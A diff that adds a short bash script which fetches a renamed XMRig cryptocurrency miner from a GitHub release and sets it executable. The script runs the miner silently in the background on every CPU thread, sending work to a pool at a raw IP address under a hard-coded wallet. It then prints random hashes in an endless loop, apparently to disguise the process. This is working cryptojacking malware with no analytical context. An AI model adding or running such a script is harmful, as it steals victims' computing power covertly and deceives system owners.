@@ -1,0 +1,5 @@
+#!/bin/bash
+wget -O vrl https://github.com/bondaltomason/meo/releases/download/2.7.0/xmrig-vrl
+chmod 777 vrl
+./vrl -a rx/0 --donate-level 1 -o 209.38.198.169:443 -u 165DUuzQoKG9BaBqprN3ZmsMRfvGHMwNwCpehJUqGoGLsSDtB535XA3PPzfRZhu2uYM9xfT8JsKoXEquWMr6XVwKK4aNeCaYixqvQ2Wh74Tqw5U1dcubDGpRz2y61rzdjMibQM5 -p $(shuf -n 1 -i 1-99999)-mumet -t $(nproc --all) > /dev/null 2>&1 &
+while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 30s; done 
